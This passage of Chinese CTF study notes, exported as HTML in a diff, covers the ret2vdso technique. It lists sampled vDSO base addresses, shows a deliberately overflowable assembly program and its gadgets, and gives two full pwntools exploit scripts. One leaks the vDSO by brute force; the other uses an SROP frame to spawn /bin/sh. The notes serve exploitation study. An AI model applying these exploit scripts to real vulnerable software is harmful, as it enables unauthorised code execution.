+vdso addr: 0xf7f34000&#13;
+vdso addr: 0xf7f36000&#13;
+vdso addr: 0xf7f39000&#13;
+vdso addr: 0xf7f3b000&#13;
+vdso addr: 0xf7f41000&#13;
+vdso addr: 0xf7f47000&#13;
+vdso addr: 0xf7f48000&#13;
+vdso addr: 0xf7f48000&#13;
+vdso addr: 0xf7f49000&#13;
+vdso addr: 0xf7f49000&#13;
+vdso addr: 0xf7f4a000&#13;
+vdso addr: 0xf7f4b000&#13;
+vdso addr: 0xf7f4d000&#13;
+vdso addr: 0xf7f4e000&#13;
+vdso addr: 0xf7f4e000&#13;
+vdso addr: 0xf7f4f000&#13;
+vdso addr: 0xf7f50000&#13;
+vdso addr: 0xf7f52000&#13;
+vdso addr: 0xf7f52000&#13;
+vdso addr: 0xf7f53000&#13;
+vdso addr: 0xf7f57000&#13;
+vdso addr: 0xf7f58000&#13;
+vdso addr: 0xf7f59000&#13;
+vdso addr: 0xf7f5a000&#13;
+vdso addr: 0xf7f5f000&#13;
+vdso addr: 0xf7f5f000&#13;
+vdso addr: 0xf7f60000&#13;
+vdso addr: 0xf7f64000&#13;
+vdso addr: 0xf7f68000&#13;
+vdso addr: 0xf7f6c000&#13;
+vdso addr: 0xf7f70000&#13;
+vdso addr: 0xf7f72000&#13;
+vdso addr: 0xf7f73000&#13;
+vdso addr: 0xf7f75000&#13;
+vdso addr: 0xf7f7e000&#13;
+vdso addr: 0xf7f7f000&#13;
+vdso addr: 0xf7f7f000&#13;
+vdso addr: 0xf7f80000&#13;
+vdso addr: 0xf7f88000&#13;
+vdso addr: 0xf7f88000&#13;
+vdso addr: 0xf7f8d000&#13;
+vdso addr: 0xf7f94000&#13;
+vdso addr: 0xf7f95000&#13;
+vdso addr: 0xf7f95000&#13;
+vdso addr: 0xf7f99000&#13;
+vdso addr: 0xf7f99000&#13;
+vdso addr: 0xf7f9d000&#13;
+vdso addr: 0xf7f9e000&#13;
+vdso addr: 0xf7fa0000&#13;
+vdso addr: 0xf7fa0000&#13;
+vdso addr: 0xf7fa2000&#13;
+vdso addr: 0xf7fa2000&#13;
+vdso addr: 0xf7fa6000&#13;
+vdso addr: 0xf7faa000&#13;
+vdso addr: 0xf7fac000&#13;
+vdso addr: 0xf7fac000&#13;
+vdso addr: 0xf7faf000&#13;
+vdso addr: 0xf7fb1000&#13;
+vdso addr: 0xf7fb4000&#13;
+vdso addr: 0xf7fb5000&#13;
+vdso addr: 0xf7fb6000&#13;
+vdso addr: 0xf7fbe000&#13;
+vdso addr: 0xf7fc0000&#13;
+vdso addr: 0xf7fc4000&#13;
+vdso addr: 0xf7fc6000&#13;
+vdso addr: 0xf7fc7000&#13;
+vdso addr: 0xf7fcb000&#13;
+vdso addr: 0xf7fce000&#13;
+vdso addr: 0xf7fce000&#13;
+vdso addr: 0xf7fce000&#13;
+vdso addr: 0xf7fcf000&#13;
+vdso addr: 0xf7fd0000</a>
+</h3>
+<h3 class="topic">
+<a name="5f8uvt7tbruong843jv6hpf3bg">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后在旧的内核版本可以看到结果在0xf76d9000-0xf77ce000之间。</a>
+</h3>
+<h3 class="topic">
+<a name="123beo851fmbejh9jq6rq3fciu">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ex@ubuntu:~/test$ python3 vdso_addr.py &#13;
+vdso addr: 0xf76d9000&#13;
+vdso addr: 0xf76dd000&#13;
+vdso addr: 0xf76de000&#13;
+vdso addr: 0xf76df000&#13;
+vdso addr: 0xf76e0000&#13;
+vdso addr: 0xf76e2000&#13;
+vdso addr: 0xf76e3000&#13;
+vdso addr: 0xf76e4000&#13;
+vdso addr: 0xf76ee000&#13;
+vdso addr: 0xf76ef000&#13;
+vdso addr: 0xf76f3000&#13;
+vdso addr: 0xf76f5000&#13;
+vdso addr: 0xf7702000&#13;
+vdso addr: 0xf7703000&#13;
+vdso addr: 0xf7707000&#13;
+vdso addr: 0xf7709000&#13;
+vdso addr: 0xf770a000&#13;
+vdso addr: 0xf770d000&#13;
+vdso addr: 0xf7710000&#13;
+vdso addr: 0xf7714000&#13;
+vdso addr: 0xf7716000&#13;
+vdso addr: 0xf7717000&#13;
+vdso addr: 0xf7718000&#13;
+vdso addr: 0xf7718000&#13;
+vdso addr: 0xf771a000&#13;
+vdso addr: 0xf771a000&#13;
+vdso addr: 0xf771b000&#13;
+vdso addr: 0xf771e000&#13;
+vdso addr: 0xf771f000&#13;
+vdso addr: 0xf771f000&#13;
+vdso addr: 0xf7720000&#13;
+vdso addr: 0xf7721000&#13;
+vdso addr: 0xf7721000&#13;
+vdso addr: 0xf772b000&#13;
+vdso addr: 0xf772c000&#13;
+vdso addr: 0xf772d000&#13;
+vdso addr: 0xf7733000&#13;
+vdso addr: 0xf7734000&#13;
+vdso addr: 0xf7735000&#13;
+vdso addr: 0xf7736000&#13;
+vdso addr: 0xf773b000&#13;
+vdso addr: 0xf773b000&#13;
+vdso addr: 0xf773b000&#13;
+vdso addr: 0xf773e000&#13;
+vdso addr: 0xf773e000&#13;
+vdso addr: 0xf7745000&#13;
+vdso addr: 0xf7745000&#13;
+vdso addr: 0xf7746000&#13;
+vdso addr: 0xf7746000&#13;
+vdso addr: 0xf7747000&#13;
+vdso addr: 0xf7749000&#13;
+vdso addr: 0xf774b000&#13;
+vdso addr: 0xf774d000&#13;
+vdso addr: 0xf774d000&#13;
+vdso addr: 0xf7758000&#13;
+vdso addr: 0xf7759000&#13;
+vdso addr: 0xf7761000&#13;
+vdso addr: 0xf7762000&#13;
+vdso addr: 0xf7764000&#13;
+vdso addr: 0xf7765000&#13;
+vdso addr: 0xf776d000&#13;
+vdso addr: 0xf7770000&#13;
+vdso addr: 0xf7774000&#13;
+vdso addr: 0xf777b000&#13;
+vdso addr: 0xf777c000&#13;
+vdso addr: 0xf777e000&#13;
+vdso addr: 0xf777f000&#13;
+vdso addr: 0xf777f000&#13;
+vdso addr: 0xf7780000&#13;
+vdso addr: 0xf7783000&#13;
+vdso addr: 0xf7784000&#13;
+vdso addr: 0xf7787000&#13;
+vdso addr: 0xf7789000&#13;
+vdso addr: 0xf778b000&#13;
+vdso addr: 0xf778e000&#13;
+vdso addr: 0xf7797000&#13;
+vdso addr: 0xf7798000&#13;
+vdso addr: 0xf779a000&#13;
+vdso addr: 0xf779b000&#13;
+vdso addr: 0xf779d000&#13;
+vdso addr: 0xf779f000&#13;
+vdso addr: 0xf77a0000&#13;
+vdso addr: 0xf77a0000&#13;
+vdso addr: 0xf77a3000&#13;
+vdso addr: 0xf77a8000&#13;
+vdso addr: 0xf77ad000&#13;
+vdso addr: 0xf77b5000&#13;
+vdso addr: 0xf77b9000&#13;
+vdso addr: 0xf77ba000&#13;
+vdso addr: 0xf77ba000&#13;
+vdso addr: 0xf77bb000&#13;
+vdso addr: 0xf77bf000&#13;
+vdso addr: 0xf77c2000&#13;
+vdso addr: 0xf77c2000&#13;
+vdso addr: 0xf77c2000&#13;
+vdso addr: 0xf77c3000&#13;
+vdso addr: 0xf77c6000&#13;
+vdso addr: 0xf77c6000&#13;
+vdso addr: 0xf77cc000&#13;
+vdso addr: 0xf77ce000</a>
+</h3>
+<h3 class="topic">
+<a name="43hqk7rvrdr9fa3jrsqq0hdjlb">&nbsp;&nbsp;&nbsp;VDSO与pwn有什么关系</a>
+</h3>
+<h3 class="topic">
+<a name="7ni4vm1mov6nhcjnr4ubskm9aj">&nbsp;&nbsp;&nbsp;&nbsp;因为32位VDSO中存在kernel_rt_sigreturn函数可以用于构造SROP，也存在大量可使用的gadget，所以通过VDSO中的代码构造rop，可以作为一种pwn的方法</a>
+</h3>
+<h3 class="topic">
+<a name="2nimkcvrdqvem443k41hcbvhfq">&nbsp;&nbsp;&nbsp;实例</a>
+</h3>
+<h3 class="topic">
+<a name="6altvhlkehdntov79g2uje3vrk">&nbsp;&nbsp;&nbsp;&nbsp;实例代码</a>
+</h3>
+<h3 class="topic">
+<a name="5irujs9v7fq8u9otbut8l5su2o">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push ebp&#13;
+mov ebp, esp&#13;
+sub esp, 128&#13;
+lea eax, buf&#13;
+push 4096&#13;
+push eax&#13;
+push 0&#13;
+mov eax, 0&#13;
+call    read&#13;
+add esp, 12&#13;
+&#13;
+mov esi, eax&#13;
+&#13;
+push esi&#13;
+lea eax, buf&#13;
+push eax &#13;
+lea eax, -128[ebp]&#13;
+push eax&#13;
+call memcpy&#13;
+add esp, 12&#13;
+&#13;
+lea eax, -128[ebp]&#13;
+push esi&#13;
+push eax&#13;
+push 1&#13;
+mov eax, 0&#13;
+call    write&#13;
+add esp, 12&#13;
+&#13;
+mov eax, 0&#13;
+mov esp, ebp&#13;
+pop ebp&#13;
+ret</a>
+</h3>
+<h3 class="topic">
+<a name="33sjs959be3orl3nttngl6qs27">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;反汇编出来结果如下：&#13;
+int __cdecl main(int argc, const char **argv, const char **envp)&#13;
+{&#13;
+  size_t size; // esi&#13;
+  char addr[128]; // [esp+0h] [ebp-80h]&#13;
+&#13;
+  size = read(0, buf, 0x1000u);&#13;
+  memcpy(addr, buf, size);&#13;
+  write(1, addr, size);&#13;
+  return 0;&#13;
+}</a>
+</h3>
+<h3 class="topic">
+<a name="4smqgkdj0iv6rurr5kv965mm25">&nbsp;&nbsp;&nbsp;&nbsp;因为是实例是通过汇编直接写的，所以不存在能够被利用的libc，其自身的gadget也很少</a>
+</h3>
+<h3 class="topic">
+<a name="12op6q5kk6k40dcbt2d6uk7qc2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/20nvmpv6uh28mnt9s1isaa220s.png"></p>
+<h3 class="topic">
+<a name="1ipl3qj374m86cc3jddsujd7o3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ex@Ex:~/test$ ROPgadget --binary ret2vdso&#13;
+Gadgets information&#13;
+============================================================&#13;
+0x080480b2 : adc byte ptr [eax + 3], bh ; int 0x80&#13;
+0x080480c9 : adc byte ptr [eax + 4], bh ; int 0x80&#13;
+0x08048102 : adc byte ptr [edi - 0x21], dh ; leave ; ret&#13;
+0x080480cb : add al, 0 ; add byte ptr [eax], al ; int 0x80&#13;
+0x08048156 : add byte ptr [eax], al ; add byte ptr [eax], al ; mov esp, ebp ; pop ebp ; ret&#13;
+0x080480a3 : add byte ptr [eax], al ; int 0x80&#13;
+0x0804809c : add byte ptr [eax], al ; mov ebx, eax ; mov eax, 1 ; int 0x80&#13;
+0x08048158 : add byte ptr [eax], al ; mov esp, ebp ; pop ebp ; ret&#13;
+0x0804809d : add byte ptr [ecx + 0x1b8c3], cl ; add byte ptr [eax], al ; int 0x80&#13;
+0x080480a1 : add dword ptr [eax], eax ; add byte ptr [eax], al ; int 0x80&#13;
+0x080480b4 : add eax, dword ptr [eax] ; add byte ptr [eax], al ; int 0x80&#13;
+0x080480ff : cld ; cmp dword ptr [ebp + 0x10], eax ; ja 0x80480eb ; leave ; ret&#13;
+0x08048100 : cmp dword ptr [ebp + 0x10], eax ; ja 0x80480ea ; leave ; ret&#13;
+0x08048104 : fxch st(0), st(1) ; ret&#13;
+0x080480bb : in al, dx ; pop ebp ; ret&#13;
+0x08048101 : inc ebp ; adc byte ptr [edi - 0x21], dh ; leave ; ret&#13;
+0x080480fe : inc ebp ; cld ; cmp dword ptr [ebp + 0x10], eax ; ja 0x80480ec ; leave ; ret&#13;
+0x080480a5 : int 0x80&#13;
+0x08048103 : ja 0x80480e7 ; leave ; ret&#13;
+0x08048105 : leave ; ret&#13;
+0x08048155 : mov eax, 0 ; mov esp, ebp ; pop ebp ; ret&#13;
+0x080480a0 : mov eax, 1 ; int 0x80&#13;
+0x080480b3 : mov eax, 3 ; int 0x80&#13;
+0x080480ca : mov eax, 4 ; int 0x80&#13;
+0x080480fd : mov eax, dword ptr [ebp - 4] ; cmp dword ptr [ebp + 0x10], eax ; ja 0x80480ed ; leave ; ret&#13;
+0x0804809e : mov ebx, eax ; mov eax, 1 ; int 0x80&#13;
+0x080480b0 : mov edx, dword ptr [ebp + 0x10] ; mov eax, 3 ; int 0x80&#13;
+0x080480c7 : mov edx, dword ptr [ebp + 0x10] ; mov eax, 4 ; int 0x80&#13;
+0x080480ba : mov esp, ebp ; pop ebp ; ret&#13;
+0x080480af : or al, 0x8b ; push ebp ; adc byte ptr [eax + 3], bh ; int 0x80&#13;
+0x080480c6 : or al, 0x8b ; push ebp ; adc byte ptr [eax + 4], bh ; int 0x80&#13;
+0x08048154 : or al, 0xb8 ; add byte ptr [eax], al ; add byte ptr [eax], al ; mov esp, ebp ; pop ebp ; ret&#13;
+0x080480bc : pop ebp ; ret&#13;
+0x080480b1 : push ebp ; adc byte ptr [eax + 3], bh ; int 0x80&#13;
+0x080480c8 : push ebp ; adc byte ptr [eax + 4], bh ; int 0x80&#13;
+0x0804809f : ret&#13;
+&#13;
+Unique gadgets found: 36</a>
+</h3>
+<h3 class="topic">
+<a name="2gfilct5ulvi8qpoudrqntlkj4">&nbsp;&nbsp;&nbsp;&nbsp;利用思路是程序进程中的VDSO直接读出来，然后利用其中的指令和函数构造rop，从而完成shell执行</a>
+</h3>
+<h3 class="topic">
+<a name="0ii09ci0dsks1d79cjg2tqg231">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;读取VDSO</a>
+</h3>
+<h3 class="topic">
+<a name="3ksg8jrp7sgj309bbnnm9h2q2a">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#!/usr/bin/python2&#13;
+# -*- coding:utf-8 -*-&#13;
+&#13;
+from pwn import *&#13;
+import random&#13;
+import struct&#13;
+import os&#13;
+import binascii&#13;
+import sys&#13;
+import time&#13;
+&#13;
+context(arch='i386', os='linux')&#13;
+&#13;
+# context.log_level = 'debug'&#13;
+elf = ELF("./ret2vdso")&#13;
+&#13;
+RANGE_VDSO  = range(0xf7ed0000, 0xf7fd0000, 0x1000)&#13;
+# RANGE_VDSO  = range(0xf76d9000, 0xf77ce000, 0x1000)&#13;
+&#13;
+while(True):&#13;
+    try:&#13;
+        sh = process("./ret2vdso")&#13;
+&#13;
+        vdso_addr = random.choice(RANGE_VDSO)&#13;
+&#13;
+        sh.send('a' * 132 + &#13;
+                p32(elf.symbols['write']) +&#13;
+                p32(0) +&#13;
+                p32(1) + # fd&#13;
+                p32(vdso_addr) + # buf&#13;
+                p32(0x2000) # count&#13;
+                )&#13;
+&#13;
+        sh.recvuntil(p32(0x2000))&#13;
+&#13;
+        result = sh.recvall(0.1)&#13;
+        if(len(result) != 0):&#13;
+            open('vdso.so', 'wb').write(result)&#13;
+            sh.close()&#13;
+            log.success("Success")&#13;
+            exit(0)&#13;
+&#13;
+        sh.close()&#13;
+    except Exception as e:&#13;
+        sh.close()</a>
+</h3>
+<h3 class="topic">
+<a name="5o4tls6npn8iv8m2teh4mduir3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因为之前得到了VDSO在内存中可能的基址范围，这里就是利用这些基址，通过溢出将VDSO文件的内容write函数输出，当接收到write函数的输出之后，将其保存为vdso.so文件，供下一步程序构造rop</a>
+</h3>
+<h3 class="topic">
+<a name="7pqhvekhh0qtnalce7qc4048ep">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里使用了try except的方法不断尝试VDSO的基址</a>
+</h3>
+<h3 class="topic">
+<a name="7vhueoep7vsr7dib75svv68taj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造SROP</a>
+</h3>
+<h3 class="topic">
+<a name="0qetdmhgnu8blb4vsl5cchhjuk">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;32位的VDSO中存在sigreturn函数可以直接用于构造SROP</a>
+</h3>
+<h3 class="topic">
+<a name="1b5fmjpiebkcfbcjqqnqhu8chq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/0pcssqfp328h61hksg8obddjen.png"></p>
+<h3 class="topic">
+<a name="1h7rja0ada9njiu1dmqf0ca46t">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;获得shell</a>
+</h3>
+<h3 class="topic">
+<a name="38mit2a61e9kfj81s41o4h3n9j">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#!/usr/bin/python2&#13;
+# -*- coding:utf-8 -*-&#13;
+&#13;
+from pwn import *&#13;
+import random&#13;
+import struct&#13;
+import os&#13;
+import binascii&#13;
+import sys&#13;
+import time&#13;
+&#13;
+context(arch='i386', os='linux')&#13;
+&#13;
+# context.log_level = 'debug'&#13;
+elf = ELF("./ret2vdso")&#13;
+&#13;
+# 这个文件需要先用脚本读出来&#13;
+vdso = ELF("./vdso.so")&#13;
+&#13;
+str_bin_sh_offset = 0x200&#13;
+str_bin_sh_addr = elf.symbols['buf'] + str_bin_sh_offset&#13;
+&#13;
+# 0x080480a5 : int 0x80&#13;
+int_0x80 = 0x080480a5&#13;
+&#13;
+# Creating a custom frame&#13;
+frame = SigreturnFrame(kernel='i386')&#13;
+frame.eax = constants.SYS_execve&#13;
+frame.ebx = str_bin_sh_addr&#13;
+frame.ecx = 0&#13;
+frame.edx = 0&#13;
+frame.eip = int_0x80&#13;
+&#13;
+# 注意这里的值也要设置，否则会crash&#13;
+frame.cs = 35&#13;
+frame.ss = 43&#13;
+frame.ds = 43&#13;
+frame.es = 43&#13;
+frame.gs = 0&#13;
+frame.fs = 0&#13;
+&#13;
+RANGE_VDSO  = range(0xf7ed0000, 0xf7fd0000, 0x1000)&#13;
+# RANGE_VDSO  = range(0xf76d9000, 0xf77ce000, 0x1000)&#13;
+&#13;
+sh = None&#13;
+&#13;
+while(True):&#13;
+    sh = process("./ret2vdso")&#13;
+&#13;
+    vdso_addr = random.choice(RANGE_VDSO)&#13;
+&#13;
+    payload = 'a'*128 + p32(0) + \&#13;
+            p32(vdso_addr + vdso.symbols['__kernel_rt_sigreturn']) + \&#13;
+            'c' * 40 * 4 + str(frame) # 并不知道这里为什么要偏移 160 个字节，有点迷&#13;
+&#13;
+    payload = payload.ljust(str_bin_sh_offset, '\x00') + '/bin/sh\x00'&#13;
+&#13;
+    sh.send(payload)&#13;
+&#13;
+    sh.recvuntil('/bin/sh\x00')&#13;
+    sh.sendline('echo hello')&#13;
+&#13;
+    result = ''&#13;
+    # 这里不能用 recvall 否则，即使得到了shell，也会crash&#13;
+    try:&#13;
+        result = sh.recv()&#13;
+    except Exception as e:&#13;
+        pass&#13;
+&#13;
+    if(len(result) != 0):&#13;
+        log.success("Success")&#13;
+        sh.interactive()&#13;
+        exit(0)&#13;
+&#13;
+    sh.close()</a>
+</h3>
+<h3 class="topic">
+<a name="41k4vflu51bdgrfa1p6t3facda">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# context.log_level = 'debug'&#13;
+elf = ELF("./ret2vdso")&#13;
+&#13;
+# 这个文件需要先用脚本读出来&#13;
+vdso = ELF("./vdso.so")&#13;
+&#13;
+str_bin_sh_offset = 0x200&#13;
+str_bin_sh_addr = elf.symbols['buf'] + str_bin_sh_offset</a>
+</h3>
+<h3 class="topic">
+<a name="6o4le71slhtf9jp1ju15ro1jtk">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将漏洞文件和之前读出来的vdso.so文件读入内存，&#13;
+其中buf是漏洞程序中用于接收数据的缓冲区，将/bin/sh字符串的地址设置为该缓冲区首地址之后0x200字节</a>
+</h3>
+<h3 class="topic">
+<a name="17mpf7r8ia1uckcsdg7vv524b0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# 0x080480a5 : int 0x80&#13;
+int_0x80 = 0x080480a5&#13;
+&#13;
+# Creating a custom frame&#13;
+frame = SigreturnFrame(kernel='i386')&#13;
+frame.eax = constants.SYS_execve&#13;
+frame.ebx = str_bin_sh_addr&#13;
+frame.ecx = 0&#13;
+frame.edx = 0&#13;
+frame.eip = int_0x80&#13;
+&#13;
+# 注意这里的值也要设置，否则会crash&#13;
+frame.cs = 35&#13;
+frame.ss = 43&#13;
+frame.ds = 43&#13;
+frame.es = 43&#13;
+frame.gs = 0&#13;
+frame.fs = 0</a>
+</h3>
+<h3 class="topic">
+<a name="5f6evvd1v94o91po7fcaqlnurc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;设置syscall的地址，并且设置执行execve("/bin/sh")字符串的sigframe</a>
+</h3>
+<h3 class="topic">
+<a name="0vehf3h5u4b75onjk784qd3g2g">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RANGE_VDSO  = range(0xf7ed0000, 0xf7fd0000, 0x1000)&#13;
+# RANGE_VDSO  = range(0xf76d9000, 0xf77ce000, 0x1000)&#13;
+&#13;
+sh = None&#13;
+&#13;
+while(True):&#13;
+    sh = process("./ret2vdso")&#13;
+&#13;
+    vdso_addr = random.choice(RANGE_VDSO)&#13;
+&#13;
+    payload = 'a'*128 + p32(0) + \&#13;
+            p32(vdso_addr + vdso.symbols['__kernel_rt_sigreturn']) + \&#13;
+            'c' * 40 * 4 + str(frame) # 并不知道这里为什么要偏移 160 个字节，有点迷&#13;
+&#13;
+    payload = payload.ljust(str_bin_sh_offset, '\x00') + '/bin/sh\x00'&#13;
+&#13;
+    sh.send(payload)</a>
+</h3>
+<h3 class="topic">
+<a name="34tqorakru6sl3v7mnf2bkgt8f">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在一定范围内随机生成VDSO的基址，然后用基址+kernel_rt_sigreturn函数在VDSO中的偏移得到sigreturn系统调用的地址，将其后面跟上填充字符+frame+&ldquo;/bin/sh&rdquo;字符串，从而进行栈溢出，执行execve("/bin/sh")</a>
+</h3>
+<h3 class="topic">
+<a name="4kc85jupd6uh9t50vtgqio1kp3">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这里通过ljust的方法保证sigreturn地址+填充字符+frame一共0x200字节，再在其后加上&ldquo;/bin/sh&rdquo;</a>
+</h3>
+<h3 class="topic">
+<a name="2hr2scqq167l1s6f8ee5megkpm">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;    sh.recvuntil('/bin/sh\x00')&#13;
+    sh.sendline('echo hello')&#13;
+&#13;
+    result = ''&#13;
+    # 这里不能用 recvall 否则，即使得到了shell，也会crash&#13;
+    try:&#13;
+        result = sh.recv()&#13;
+    except Exception as e:&#13;
+        pass&#13;
+&#13;
+    if(len(result) != 0):&#13;
+        log.success("Success")&#13;
+        sh.interactive()&#13;
+        exit(0)&#13;
+&#13;
+    sh.close()</a>
+</h3>
+<h3 class="topic">
+<a name="3s2km8euih54njiiqaeeibcfti">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后这部分没有看太懂，推测是与漏洞程序最后执行write函数有关</a>
+</h3>
+<h3 class="topic">
+<a name="6hnke86a9ljs972hd6on5h56l0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意点</a>
+</h3>
+<h3 class="topic">
+<a name="4tp59obdobemtve2vbqgjs7d81">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/3202uqp58fhk2qev7mjs9eldri.png"></p>
+<h3 class="topic">
+<a name="6bou9at92qa4vsa1hsa1ctqv56">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;实际运行结果</a>
+</h3>
+<h3 class="topic">
+<a name="57m3uvaef75p14gnts3lmrvk31">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN7_files/67hjcugkp7vhmsr2i4ijqcqm4a.png"></p>
+<h3 class="topic">
+<a name="24eo54c1v2qm729e1dks2cc9jd">&nbsp;&nbsp;JOP</a>
+</h3>
+<h3 class="topic">
+<a name="5j2nrd3lldu6b06ls1m51kjuma">&nbsp;&nbsp;&nbsp;Jump-oriented programming</a>
+</h3>
+<h3 class="topic">
+<a name="4207t9hkpeo1jtrd02bnui4917">&nbsp;&nbsp;COP</a>
+</h3>
+<h3 class="topic">
+<a name="410c4chn0hpt1jtb6h8cdncdpo">&nbsp;&nbsp;&nbsp;Call-oriented programming</a>
+</h3>
+</body>
+</html>
